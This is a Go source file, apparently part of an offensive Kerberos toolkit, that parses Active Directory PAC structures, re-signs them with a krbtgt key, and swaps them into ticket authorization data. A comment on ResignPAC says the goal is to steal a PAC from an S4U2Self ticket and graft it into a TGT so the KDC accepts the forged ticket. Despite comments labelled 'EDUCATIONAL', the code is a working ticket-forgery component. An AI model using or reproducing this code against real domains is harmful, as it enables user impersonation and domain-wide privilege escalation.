package pac

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"encoding/binary"
	"fmt"

	"github.com/goobeus/goobeus/pkg/crypto"
)

// ═══════════════════════════════════════════════════════════════════════════════
// PAC SIGNING AND RE-SIGNING
// ═══════════════════════════════════════════════════════════════════════════════
//
// PAC SIGNATURE TYPES (MS-PAC 2.8):
// ═════════════════════════════════
//
//   Server Checksum (Type 6):
//   - Signs the entire PAC (with both signatures zeroed)
//   - Uses the service key (for TGT, this is krbtgt key)
//   - Proves the service (or KDC) created this PAC
//
//   KDC Checksum (Type 7):
//   - Signs ONLY the Server Checksum signature bytes
//   - Always uses krbtgt key
//   - Proves the KDC vouches for this PAC
//   - "Signature of the signature"
//
// CHECKSUM ALGORITHMS:
// ════════════════════
//
//   HMAC_MD5 (-138, 0xFFFFFF76):
//   - Used with RC4 encryption
//   - 16-byte signature
//   - Key derivation: HMAC_MD5(key, "signaturekey\x00")
//
//   HMAC_SHA1_96_AES (15, 16):
//   - Used with AES128/AES256 encryption
//   - 12-byte signature (SHA1 truncated)
//   - Uses Kerberos key derivation
//
// RE-SIGNING PROCESS:
// ═══════════════════
//
//   1. Parse PAC to locate signature buffers
//   2. Zero out both Server and KDC signature bytes (keep type fields)
//   3. Calculate Server Checksum over entire PAC
//   4. Insert Server signature
//   5. Calculate KDC Checksum over Server signature bytes only
//   6. Insert KDC signature
//

// Checksum algorithm constants
const (
	// KERB_CHECKSUM_HMAC_MD5 for RC4 encryption (signed 32-bit)
	KERB_CHECKSUM_HMAC_MD5 int32 = -138

	// HMAC_SHA1_96_AES128 for AES128 encryption
	HMAC_SHA1_96_AES128 int32 = 15

	// HMAC_SHA1_96_AES256 for AES256 encryption
	HMAC_SHA1_96_AES256 int32 = 16
)

// ParsePACForSigning parses a PAC from raw bytes for re-signing.
func ParsePACForSigning(data []byte) (*PAC, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("PAC too short: %d bytes", len(data))
	}

	pac := &PAC{
		RawData: make([]byte, len(data)),
	}
	copy(pac.RawData, data)

	// Read header: cBuffers (4 bytes) + Version (4 bytes)
	cBuffers := binary.LittleEndian.Uint32(data[0:4])
	pac.Version = binary.LittleEndian.Uint32(data[4:8])

	if pac.Version != 0 {
		return nil, fmt.Errorf("unsupported PAC version: %d", pac.Version)
	}

	// Read buffer info entries (each is 16 bytes)
	offset := 8
	for i := uint32(0); i < cBuffers; i++ {
		if offset+16 > len(data) {
			return nil, fmt.Errorf("PAC truncated at buffer %d", i)
		}

		buf := PACBuffer{
			Type:   binary.LittleEndian.Uint32(data[offset : offset+4]),
			Size:   binary.LittleEndian.Uint32(data[offset+4 : offset+8]),
			Offset: binary.LittleEndian.Uint64(data[offset+8 : offset+16]),
		}

		// Extract buffer data
		bufStart := int(buf.Offset)
		bufEnd := bufStart + int(buf.Size)
		if bufStart >= 0 && bufEnd <= len(data) {
			buf.Data = make([]byte, buf.Size)
			copy(buf.Data, data[bufStart:bufEnd])
		}

		pac.Buffers = append(pac.Buffers, buf)
		offset += 16
	}

	return pac, nil
}

// GetBuffer returns the buffer of the specified type, or nil if not found.
func (p *PAC) GetBuffer(bufType uint32) *PACBuffer {
	for i := range p.Buffers {
		if p.Buffers[i].Type == bufType {
			return &p.Buffers[i]
		}
	}
	return nil
}

// ResignPAC re-signs a PAC with the provided key.
//
// EDUCATIONAL: Why PAC Re-signing is Needed
//
// When we steal a PAC from an S4U2Self ticket and insert it into a TGT:
// - The original PAC was signed with different keys
// - The KDC will validate the signatures when we use the TGT
// - We must re-sign with the krbtgt key to match the TGT encryption
//
// Parameters:
//   - pacData: Raw PAC bytes
//   - key: The krbtgt key (AES256, AES128, or RC4/NTLM)
//   - etype: Encryption type (18=AES256, 17=AES128, 23=RC4)
//
// Returns the re-signed PAC bytes.
func ResignPAC(pacData []byte, key []byte, etype int32) ([]byte, error) {
	pac, err := ParsePACForSigning(pacData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse PAC: %w", err)
	}

	// Make a copy of the PAC data to modify
	newPAC := make([]byte, len(pacData))
	copy(newPAC, pacData)

	// Find signature buffers
	serverSigBuf := pac.GetBuffer(ServerChecksumType)
	kdcSigBuf := pac.GetBuffer(KDCChecksumType)

	if serverSigBuf == nil {
		return nil, fmt.Errorf("PAC has no server signature buffer")
	}
	if kdcSigBuf == nil {
		return nil, fmt.Errorf("PAC has no KDC signature buffer")
	}

	// Determine checksum type and signature size based on etype
	var checksumType int32
	var sigSize int

	switch etype {
	case crypto.EtypeAES256:
		checksumType = HMAC_SHA1_96_AES256
		sigSize = 12
	case crypto.EtypeAES128:
		checksumType = HMAC_SHA1_96_AES128
		sigSize = 12
	case crypto.EtypeRC4:
		checksumType = KERB_CHECKSUM_HMAC_MD5
		sigSize = 16
	default:
		return nil, fmt.Errorf("unsupported etype for PAC signing: %d", etype)
	}

	// Get offsets
	serverSigOffset := int(serverSigBuf.Offset)
	kdcSigOffset := int(kdcSigBuf.Offset)

	// Step 1: Update checksum types in the signature buffers
	binary.LittleEndian.PutUint32(newPAC[serverSigOffset:serverSigOffset+4], uint32(checksumType))
	binary.LittleEndian.PutUint32(newPAC[kdcSigOffset:kdcSigOffset+4], uint32(checksumType))

	// Step 2: Zero out both signatures (keep the type field at offset +0)
	for i := 0; i < sigSize; i++ {
		if serverSigOffset+4+i < len(newPAC) {
			newPAC[serverSigOffset+4+i] = 0
		}
		if kdcSigOffset+4+i < len(newPAC) {
			newPAC[kdcSigOffset+4+i] = 0
		}
	}

	// Step 3: Calculate Server Checksum over entire PAC (with zeroed signatures)
	serverSig, err := calculatePACChecksum(newPAC, key, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to calculate server signature: %w", err)
	}

	// Step 4: Insert Server signature
	copy(newPAC[serverSigOffset+4:], serverSig[:sigSize])

	// Step 5: Calculate KDC Checksum over the Server signature only
	kdcSig, err := calculatePACChecksum(serverSig[:sigSize], key, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to calculate KDC signature: %w", err)
	}

	// Step 6: Insert KDC signature
	copy(newPAC[kdcSigOffset+4:], kdcSig[:sigSize])

	return newPAC, nil
}

// calculatePACChecksum calculates a PAC checksum.
//
// EDUCATIONAL: PAC Checksum Algorithm
//
// For HMAC_MD5 (RC4):
//  1. Derive signing key: HMAC_MD5(key, "signaturekey\x00")
//  2. Calculate: HMAC_MD5(signing_key, data)
//
// For HMAC_SHA1_96_AES:
//  1. Derive key using Kerberos key derivation (usage=17, type=checksum)
//  2. Calculate: HMAC_SHA1(derived_key, data)[0:12]
func calculatePACChecksum(data []byte, key []byte, etype int32) ([]byte, error) {
	switch etype {
	case crypto.EtypeAES256:
		// Use the crypto package's proper implementation
		return crypto.HMACSHA1AES256(key, data)

	case crypto.EtypeAES128:
		return crypto.HMACSHA1AES128(key, data)

	case crypto.EtypeRC4:
		// RC4/HMAC_MD5 checksum
		// Step 1: Derive signing key
		signKey := hmacMD5(key, []byte("signaturekey\x00"))

		// Step 2: HMAC-MD5 with signing key
		return hmacMD5(signKey, data), nil

	default:
		return nil, fmt.Errorf("unsupported etype: %d", etype)
	}
}

// hmacMD5 calculates HMAC-MD5.
func hmacMD5(key, data []byte) []byte {
	h := hmac.New(md5.New, key)
	h.Write(data)
	return h.Sum(nil)
}

// DebugPAC prints debug information about a PAC.
func DebugPAC(data []byte) {
	pac, err := ParsePACForSigning(data)
	if err != nil {
		fmt.Printf("[DEBUG] PAC parse error: %v\n", err)
		return
	}

	fmt.Printf("[DEBUG] PAC: %d buffers, version %d, size %d\n",
		len(pac.Buffers), pac.Version, len(data))

	for i, buf := range pac.Buffers {
		typeName := getBufferTypeName(buf.Type)
		fmt.Printf("  [%d] Type=%d (%s), Size=%d, Offset=%d\n",
			i, buf.Type, typeName, buf.Size, buf.Offset)

		// For signature buffers, show details
		if buf.Type == ServerChecksumType || buf.Type == KDCChecksumType {
			if len(buf.Data) >= 4 {
				sigType := int32(binary.LittleEndian.Uint32(buf.Data[0:4]))
				sigTypeName := getChecksumTypeName(sigType)
				fmt.Printf("       SigType=%d (%s)\n", sigType, sigTypeName)
				if len(buf.Data) > 4 {
					sigBytes := buf.Data[4:]
					if len(sigBytes) > 8 {
						sigBytes = sigBytes[:8]
					}
					fmt.Printf("       Sig (first 8): %x\n", sigBytes)
				}
			}
		}
	}
}

func getBufferTypeName(t uint32) string {
	switch t {
	case LogonInfoType:
		return "LOGON_INFO"
	case CredentialsType:
		return "CREDENTIALS"
	case ServerChecksumType:
		return "SERVER_CHECKSUM"
	case KDCChecksumType:
		return "KDC_CHECKSUM"
	case ClientInfoType:
		return "CLIENT_INFO"
	case S4UDelegationInfoType:
		return "S4U_DELEGATION"
	case UPNDNSInfoType:
		return "UPN_DNS_INFO"
	case ClientClaimsType:
		return "CLIENT_CLAIMS"
	case DeviceInfoType:
		return "DEVICE_INFO"
	case DeviceClaimsType:
		return "DEVICE_CLAIMS"
	case TicketChecksumType:
		return "TICKET_CHECKSUM"
	case AttributesType:
		return "ATTRIBUTES_INFO"
	case RequestorType:
		return "REQUESTOR_SID"
	default:
		return "UNKNOWN"
	}
}

func getChecksumTypeName(t int32) string {
	switch t {
	case KERB_CHECKSUM_HMAC_MD5:
		return "HMAC_MD5"
	case HMAC_SHA1_96_AES128:
		return "HMAC_SHA1_96_AES128"
	case HMAC_SHA1_96_AES256:
		return "HMAC_SHA1_96_AES256"
	default:
		return "UNKNOWN"
	}
}

// FindPACInAuthData locates the PAC within Kerberos AuthorizationData.
// Returns the PAC bytes and the offset where they were found.
func FindPACInAuthData(data []byte) (pacData []byte, offset int, found bool) {
	// PAC signature: first 4 bytes is buffer count (small), next 4 is version (0)
	for i := 0; i < len(data)-8; i++ {
		bufCount := binary.LittleEndian.Uint32(data[i : i+4])
		version := binary.LittleEndian.Uint32(data[i+4 : i+8])

		// PAC has version 0 and reasonable buffer count (1-20)
		if version == 0 && bufCount > 0 && bufCount < 20 {
			// Calculate expected header size
			headerSize := 8 + (16 * int(bufCount))
			if i+headerSize > len(data) {
				continue
			}

			// Verify buffer offsets are valid
			valid := true
			maxEnd := headerSize
			for j := 0; j < int(bufCount); j++ {
				bufOffset := 8 + (j * 16)
				if i+bufOffset+16 > len(data) {
					valid = false
					break
				}
				off := int(binary.LittleEndian.Uint64(data[i+bufOffset+8 : i+bufOffset+16]))
				size := int(binary.LittleEndian.Uint32(data[i+bufOffset+4 : i+bufOffset+8]))

				// Offset should be within PAC, and size should be reasonable
				if off > len(data)-i || size > len(data)-i || off+size > len(data)-i {
					valid = false
					break
				}
				if off+size > maxEnd {
					maxEnd = off + size
				}
			}

			if valid {
				// Align to 8 bytes
				maxEnd = (maxEnd + 7) &^ 7
				if i+maxEnd <= len(data) {
					return data[i : i+maxEnd], i, true
				}
				return data[i:], i, true
			}
		}
	}
	return nil, 0, false
}

// ReplacePACInAuthData replaces the PAC bytes in AuthorizationData.
func ReplacePACInAuthData(authData []byte, newPAC []byte) ([]byte, error) {
	oldPAC, offset, found := FindPACInAuthData(authData)
	if !found {
		return nil, fmt.Errorf("no PAC found in authorization data")
	}

	// Verify we found the right location
	if !bytes.Equal(authData[offset:offset+len(oldPAC)], oldPAC) {
		return nil, fmt.Errorf("PAC location mismatch")
	}

	oldLen := len(oldPAC)
	newLen := len(newPAC)

	// Build result with replaced PAC
	result := make([]byte, len(authData)-oldLen+newLen)
	copy(result[:offset], authData[:offset])
	copy(result[offset:], newPAC)
	copy(result[offset+newLen:], authData[offset+oldLen:])

	return result, nil
}
